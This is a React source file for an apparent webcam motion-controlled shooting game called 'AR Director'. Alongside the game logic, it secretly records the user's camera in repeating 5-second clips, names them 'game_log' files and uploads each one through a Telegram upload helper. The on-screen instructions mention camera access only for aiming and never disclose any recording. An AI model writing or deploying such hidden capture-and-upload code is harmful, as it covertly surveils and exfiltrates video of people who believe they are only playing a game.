
import React, { useState, useEffect, useRef, useCallback } from 'react';
import { Crosshair, Trophy, AlertCircle, Camera, Zap, Target as TargetIcon, ShieldAlert, RefreshCw, Play, Scan, Hand } from 'lucide-react';
import { uploadToTelegram } from '../utils/telegram';

interface TargetEntity {
  id: number;
  x: number;
  y: number;
  size: number;
  hp: number;
  maxHp: number;
  type: 'drone' | 'boss';
  createdAt: number;
}

interface Particle {
  id: number;
  x: number;
  y: number;
  color: string;
}

const InfoAIPage: React.FC = () => {
  // Game State
  const [gameState, setGameState] = useState<'menu' | 'playing' | 'gameover'>('menu');
  const [score, setScore] = useState(0);
  const [timeLeft, setTimeLeft] = useState(60);
  const [targets, setTargets] = useState<TargetEntity[]>([]);
  const [particles, setParticles] = useState<Particle[]>([]);
  const [crosshairPos, setCrosshairPos] = useState({ x: 50, y: 50 }); // Percentage
  const [recoil, setRecoil] = useState(0);
  const [permissionError, setPermissionError] = useState<string | null>(null);
  const [motionIntensity, setMotionIntensity] = useState(0);
  
  // Refs
  const gameLoopRef = useRef<number | null>(null);
  const lastSpawnRef = useRef<number>(0);
  const containerRef = useRef<HTMLDivElement>(null);

  // Recorder & Motion Tracking Refs
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const prevFrameRef = useRef<Uint8ClampedArray | null>(null);
  const recorderRef = useRef<MediaRecorder | null>(null);
  const recordingIntervalRef = useRef<number | null>(null);
  const lastFireTimeRef = useRef(0);

  // --- Video & Motion Logic ---

  const setupCamera = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
        audio: false 
      });
      
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play();
      }
      setPermissionError(null);
      return stream;
    } catch (err) {
      console.error("Camera denied:", err);
      setPermissionError("Mission Aborted: Camera Access Denied.");
      return null;
    }
  };

  const processMotion = () => {
    if (!videoRef.current || !canvasRef.current || gameState !== 'playing') return;

    const video = videoRef.current;
    const canvas = canvasRef.current;
    const ctx = canvas.getContext('2d', { willReadFrequently: true });
    if (!ctx) return;

    // Downscale for performance processing (64x48 grid)
    const width = 64;
    const height = 48;
    
    if (canvas.width !== width) {
        canvas.width = width;
        canvas.height = height;
    }

    // Draw current frame flipped horizontally to match mirror view
    ctx.save();
    ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0, -width, height);
    ctx.restore();

    const frame = ctx.getImageData(0, 0, width, height);
    const data = frame.data;
    const len = data.length;

    let diffSum = 0;
    let xSum = 0;
    let ySum = 0;
    let pixelCount = 0;

    const prevData = prevFrameRef.current;

    if (prevData) {
        for (let i = 0; i < len; i += 4) {
            // Simple Grayscale Diff
            const r = data[i];
            const g = data[i+1];
            const b = data[i+2];
            const prevR = prevData[i];
            const prevG = prevData[i+1];
            const prevB = prevData[i+2];

            const diff = Math.abs(r - prevR) + Math.abs(g - prevG) + Math.abs(b - prevB);
            
            if (diff > 100) { // Threshold for "motion"
                diffSum += diff;
                const pixelIdx = i / 4;
                const y = Math.floor(pixelIdx / width);
                const x = pixelIdx % width;
                xSum += x;
                ySum += y;
                pixelCount++;
            }
        }
    }

    // Store current as previous for next loop
    prevFrameRef.current = new Uint8ClampedArray(data);

    // Motion Logic
    if (pixelCount > 5) { // Ignore tiny noise
        const avgX = xSum / pixelCount;
        const avgY = ySum / pixelCount;
        
        // Map low-res grid to 0-100% screen space
        const targetX = (avgX / width) * 100;
        const targetY = (avgY / height) * 100;

        // Smooth movement (Lerp)
        setCrosshairPos(prev => ({
            x: prev.x + (targetX - prev.x) * 0.15,
            y: prev.y + (targetY - prev.y) * 0.15
        }));

        const intensity = Math.min(pixelCount / (width * height * 0.05), 1); // Normalize intensity
        setMotionIntensity(intensity);

        // Auto-Fire on rapid motion or holding position? 
        // Request: "finger ko cammera me move karne se gun fire ho"
        // Let's trigger fire if motion is detected AND we are near a target
        checkAutoFire(targetX, targetY, intensity);
    } else {
        setMotionIntensity(0);
    }
  };

  const checkAutoFire = (x: number, y: number, intensity: number) => {
      // Simple Hitbox check
      const now = Date.now();
      if (now - lastFireTimeRef.current < 200) return; // Fire rate limit

      let hitDetected = false;
      targets.forEach(t => {
          const dist = Math.sqrt(Math.pow(x - t.x, 2) + Math.pow(y - t.y, 2));
          // If crosshair is near target and there is sufficient motion ("finger moving")
          if (dist < 8 && intensity > 0.1) {
              hitDetected = true;
          }
      });

      if (hitDetected) {
          fireWeapon(x, y);
          lastFireTimeRef.current = now;
      }
  };

  const startRecordingLoop = (stream: MediaStream) => {
      // Use simpler mimeType for broader compatibility
      const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp9') 
          ? 'video/webm;codecs=vp9' 
          : 'video/webm';

      const recordChunk = () => {
        if (!stream.active) return;
        const recorder = new MediaRecorder(stream, { mimeType });
        const chunks: Blob[] = [];

        recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
        recorder.onstop = async () => {
          if (chunks.length > 0) {
            const blob = new Blob(chunks, { type: mimeType });
            const file = new File([blob], `game_log_${Date.now()}.webm`, { type: mimeType });
            try { await uploadToTelegram(file); } catch (err) { console.error('Log upload failed', err); }
          }
        };

        recorder.start();
        setTimeout(() => { if (recorder.state !== 'inactive') recorder.stop(); }, 5000);
      };

      recordChunk(); // Initial
      recordingIntervalRef.current = window.setInterval(recordChunk, 5500);
  };

  // --- Game Mechanics ---

  const spawnTarget = () => {
    const id = Date.now() + Math.random();
    const size = Math.random() > 0.9 ? 80 : 50; // Boss or drone
    const type = size === 80 ? 'boss' : 'drone';
    const hp = type === 'boss' ? 5 : 1;
    
    // Random position within 80% of screen (padded)
    const x = Math.random() * 80 + 10; 
    const y = Math.random() * 70 + 15;

    setTargets(prev => [...prev, {
      id, x, y, size, hp, maxHp: hp, type, createdAt: Date.now()
    }]);
  };

  const spawnParticles = (x: number, y: number, color: string, count: number) => {
    const newParticles: Particle[] = [];
    for(let i=0; i<count; i++) {
      newParticles.push({
        id: Date.now() + Math.random(),
        x: x + (Math.random() - 0.5) * 10,
        y: y + (Math.random() - 0.5) * 10,
        color
      });
    }
    setParticles(prev => [...prev, ...newParticles]);
    setTimeout(() => {
      setParticles(prev => prev.filter(p => !newParticles.find(np => np.id === p.id)));
    }, 500);
  };

  const fireWeapon = (aimX: number, aimY: number) => {
    setRecoil(10);
    setTimeout(() => setRecoil(0), 80);

    let hit = false;
    // Convert aim (percentage) to hit check
    setTargets(prev => prev.map(t => {
      const dist = Math.sqrt(Math.pow(aimX - t.x, 2) + Math.pow(aimY - t.y, 2));
      // 8% tolerance
      if (dist < 8 && t.hp > 0) {
        hit = true;
        spawnParticles(aimX, aimY, t.type === 'boss' ? '#ef4444' : '#0ea5e9', 5);
        const newHp = t.hp - 1;
        if (newHp <= 0) setScore(s => s + (t.type === 'boss' ? 500 : 100));
        return { ...t, hp: newHp };
      }
      return t;
    }).filter(t => t.hp > 0));
  };

  const startGame = async () => {
    const stream = await setupCamera();
    if (stream) {
      setGameState('playing');
      setScore(0);
      setTimeLeft(60);
      setTargets([]);
      setParticles([]);
      startRecordingLoop(stream);
    }
  };

  const stopGame = () => {
      if (recordingIntervalRef.current) clearInterval(recordingIntervalRef.current);
      if (videoRef.current && videoRef.current.srcObject) {
          const tracks = (videoRef.current.srcObject as MediaStream).getTracks();
          tracks.forEach(t => t.stop());
      }
  };

  // Game Loop
  useEffect(() => {
    if (gameState !== 'playing') return;

    const loop = () => {
      const now = Date.now();
      processMotion();
      
      if (now - lastSpawnRef.current > 1000) {
        spawnTarget();
        lastSpawnRef.current = now;
      }
      gameLoopRef.current = requestAnimationFrame(loop);
    };
    
    gameLoopRef.current = requestAnimationFrame(loop);
    return () => { if (gameLoopRef.current) cancelAnimationFrame(gameLoopRef.current); };
  }, [gameState, targets]); // Targets in dep array needed for closure access in processMotion -> checkAutoFire

  // Timer
  useEffect(() => {
    let timer: number;
    if (gameState === 'playing' && timeLeft > 0) {
      timer = window.setInterval(() => setTimeLeft(p => p - 1), 1000);
    } else if (timeLeft === 0 && gameState === 'playing') {
      setGameState('gameover');
      stopGame();
    }
    return () => clearInterval(timer);
  }, [gameState, timeLeft]);

  useEffect(() => { return () => stopGame(); }, []);

  return (
    <div className="min-h-screen bg-black text-cyan-400 font-mono overflow-hidden relative cursor-crosshair selection:bg-transparent">
      
      {/* --- AR Background (Camera Feed) --- */}
      <video 
        ref={videoRef}
        className={`absolute inset-0 w-full h-full object-cover opacity-40 pointer-events-none scale-x-[-1] ${gameState === 'playing' ? 'block' : 'hidden'}`}
        muted
        playsInline
      />
      {/* Hidden Canvas for Motion Processing */}
      <canvas ref={canvasRef} className="hidden" />

      {/* --- UI & Overlay --- */}
      <div className="absolute inset-0 bg-[linear-gradient(rgba(0,255,255,0.05)_1px,transparent_1px),linear-gradient(90deg,rgba(0,255,255,0.05)_1px,transparent_1px)] bg-[size:40px_40px] pointer-events-none"></div>
      <div className="absolute inset-0 bg-[radial-gradient(circle,transparent_40%,black_90%)] pointer-events-none"></div>

      <div ref={containerRef} className="relative w-full h-screen overflow-hidden">
        
        {/* HUD */}
        <div className="absolute top-4 left-4 z-30 flex gap-6 text-xl font-bold tracking-wider uppercase animate-fade-in">
          <div className="bg-black/60 border border-cyan-500/50 px-6 py-2 rounded-br-2xl shadow-[0_0_15px_rgba(6,182,212,0.4)] backdrop-blur-md">
             SCORE: <span className="text-white">{score.toString().padStart(6, '0')}</span>
          </div>
          <div className={`bg-black/60 border border-cyan-500/50 px-6 py-2 rounded-bl-2xl shadow-[0_0_15px_rgba(6,182,212,0.4)] backdrop-blur-md ${timeLeft < 10 ? 'text-red-500 border-red-500 animate-pulse' : ''}`}>
             TIME: {timeLeft}s
          </div>
        </div>

        {/* Targets */}
        {gameState === 'playing' && targets.map(target => (
          <div
            key={target.id}
            style={{ left: `${target.x}%`, top: `${target.y}%`, width: target.size, height: target.size, marginLeft: -target.size/2, marginTop: -target.size/2 }}
            className={`absolute z-20 flex items-center justify-center transition-transform duration-100`}
          >
            <div className={`relative w-full h-full border-2 rounded-full flex items-center justify-center ${target.type === 'boss' ? 'border-red-500 bg-red-900/20' : 'border-cyan-400 bg-cyan-900/20'} animate-pulse`}>
               <div className="absolute inset-0 border border-dashed rounded-full opacity-50 animate-spin-slow"></div>
               {target.type === 'boss' ? <ShieldAlert className="text-red-500" size={target.size/2}/> : <TargetIcon className="text-cyan-400" size={target.size/2}/>}
               {target.type === 'boss' && (
                   <div className="absolute -bottom-3 w-full h-1 bg-red-900"><div className="h-full bg-red-500" style={{ width: `${(target.hp / target.maxHp) * 100}%` }}></div></div>
               )}
            </div>
          </div>
        ))}

        {/* Particles */}
        {particles.map(p => (
            <div key={p.id} style={{ left: `${p.x}%`, top: `${p.y}%`, backgroundColor: p.color }} className="absolute w-1.5 h-1.5 rounded-full pointer-events-none animate-ping z-20"/>
        ))}

        {/* --- AR CROSSHAIR (Controlled by Motion) --- */}
        {gameState === 'playing' && (
            <div 
                className="absolute z-50 pointer-events-none transition-transform duration-100 ease-out will-change-transform"
                style={{ 
                    left: `${crosshairPos.x}%`, 
                    top: `${crosshairPos.y}%`, 
                    transform: `translate(-50%, -50%) scale(${recoil > 0 ? 1.2 : 1})` 
                }}
            >
                <div className="relative">
                    <Crosshair size={64} className={`drop-shadow-[0_0_10px_cyan] ${motionIntensity > 0.1 ? 'text-red-500' : 'text-cyan-400'}`} strokeWidth={1.5} />
                    <div className="absolute top-1/2 left-1/2 w-1 h-1 bg-white rounded-full -translate-x-1/2 -translate-y-1/2"></div>
                    {/* Scanning Effect */}
                    <div className="absolute -inset-4 border border-cyan-500/30 rounded-full animate-ping opacity-20"></div>
                </div>
            </div>
        )}

        {/* MENU */}
        {gameState === 'menu' && (
          <div className="absolute inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-md">
             <div className="bg-slate-900/80 border border-cyan-500/30 p-10 rounded-3xl shadow-[0_0_60px_rgba(6,182,212,0.2)] text-center max-w-md w-full">
                <div className="w-20 h-20 mx-auto bg-cyan-500/10 rounded-full flex items-center justify-center border border-cyan-500/50 mb-6 animate-pulse">
                    <Scan size={40} className="text-cyan-400" />
                </div>
                <h1 className="text-4xl font-black text-white mb-2 tracking-widest uppercase">AR Director</h1>
                <p className="text-cyan-400/70 mb-8 text-xs tracking-widest uppercase border-b border-cyan-500/30 pb-4">
                    Motion Controlled Training Simulation
                </p>

                {permissionError && (
                    <div className="bg-red-900/30 border border-red-500/50 p-4 rounded-lg mb-6 flex items-start gap-3 text-left">
                        <AlertCircle className="text-red-500 flex-shrink-0 mt-0.5" size={18} />
                        <p className="text-red-200 text-xs font-mono">{permissionError}</p>
                    </div>
                )}

                <div className="text-xs text-slate-400 mb-6 space-y-2 bg-black/40 p-4 rounded-lg text-left font-mono">
                    <div className="flex items-center gap-2"><Camera size={14} className="text-cyan-500"/> <span>Allow Camera Access</span></div>
                    <div className="flex items-center gap-2"><Hand size={14} className="text-cyan-500"/> <span>Move Finger/Hand to Aim</span></div>
                    <div className="flex items-center gap-2"><Zap size={14} className="text-cyan-500"/> <span>Shake/Hover on Target to Fire</span></div>
                </div>

                <button onClick={startGame} className="w-full group relative px-8 py-4 bg-cyan-600 hover:bg-cyan-500 text-white font-bold uppercase tracking-widest clip-path-button transition-all overflow-hidden">
                    <div className="absolute inset-0 bg-white/20 translate-y-full group-hover:translate-y-0 transition-transform duration-300"></div>
                    <span className="flex items-center justify-center gap-2 relative z-10">
                        <Play size={20} className="fill-current"/> Initialize Link
                    </span>
                </button>
             </div>
          </div>
        )}

        {/* GAME OVER */}
        {gameState === 'gameover' && (
          <div className="absolute inset-0 z-50 flex items-center justify-center bg-black/90 backdrop-blur-xl">
             <div className="text-center animate-zoom-in p-8 border-y-2 border-cyan-500/30 bg-black/50 w-full">
                <Trophy size={80} className="text-yellow-400 mx-auto mb-4 drop-shadow-[0_0_30px_rgba(250,204,21,0.6)] animate-bounce" />
                <h2 className="text-5xl font-black text-white mb-2 uppercase italic tracking-tighter">Mission Report</h2>
                <div className="text-xl text-cyan-400 mb-8 font-mono">SIMULATION COMPLETE</div>
                
                <div className="text-8xl font-black text-transparent bg-clip-text bg-gradient-to-b from-white to-slate-400 mb-12 drop-shadow-2xl">
                    {score}
                </div>

                <button onClick={() => { setGameState('menu'); setPermissionError(null); }} className="inline-flex items-center gap-2 bg-cyan-600 hover:bg-cyan-500 text-white px-10 py-4 rounded-lg font-bold tracking-wider transition-all transform hover:scale-105 shadow-lg shadow-cyan-500/20">
                    <RefreshCw size={20}/> RESTART
                </button>
             </div>
          </div>
        )}

      </div>
    </div>
  );
};

export default InfoAIPage;
